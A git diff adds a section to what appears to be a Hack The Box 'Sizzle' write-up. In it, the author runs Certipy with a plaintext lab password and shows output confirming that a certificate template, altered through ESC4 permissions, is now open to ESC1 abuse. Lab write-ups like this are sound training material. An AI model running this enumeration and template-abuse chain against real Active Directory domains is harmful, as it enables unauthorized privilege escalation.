@@ -435,4 +435,92 @@ Are you sure you want to apply these changes to 'SSL'? (y/N): y
 ```
 Using ESC4 i can modify the template to make it vulnerable to ESC1
 
-## ES
+## ESC1
+```python
+certipy-ad find -u amanda@htb.local -p 'Ashare1972' -vulnerable -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: HTB.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 18 issuance policies
+[*] Found 0 OIDs linked to templates
+[!] DNS resolution failed: The DNS query name does not exist: sizzle.HTB.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Retrieving CA configuration for 'HTB-SIZZLE-CA' via RRP
+[*] Successfully retrieved CA configuration for 'HTB-SIZZLE-CA'
+[*] Checking web enrollment for CA 'HTB-SIZZLE-CA' @ 'sizzle.HTB.LOCAL'
+[!] Failed to check channel binding: The read operation timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : HTB-SIZZLE-CA
+    DNS Name                            : sizzle.HTB.LOCAL
+    Certificate Subject                 : CN=HTB-SIZZLE-CA, DC=HTB, DC=LOCAL
+    Certificate Serial Number           : 753496F256EE309F456E223A2AE01EA2
+    Certificate Validity Start          : 2018-07-02 20:26:03+00:00
+    Certificate Validity End            : 2028-07-02 20:36:02+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : True
+        Channel Binding (EPA)           : Unknown
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : HTB.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        ManageCertificates              : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        Enroll                          : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+Certificate Templates
+  0
+    Template Name                       : SSL
+    Display Name                        : SSL
+    Certificate Authorities             : HTB-SIZZLE-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2018-07-03T18:06:11+00:00
+    Template Last Modified              : 2026-04-06T16:31:09+00:00
+    Permissions
+      Object Control Permissions
+        Owner                           : HTB.LOCAL\Administrator
+        Full Control Principals         : HTB.LOCAL\Authenticated Users
+        Write Owner Principals          : HTB.LOCAL\Authenticated Users
+        Write Dacl Principals           : HTB.LOCAL\Authenticated Users
+    [+] User Enrollable Principals      : HTB.LOCAL\Authenticated Users
+    [+] User ACL Principals             : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC4                              : User has dangerous permissions.
+```
+As seen here its now vulnerable to ESC1
+
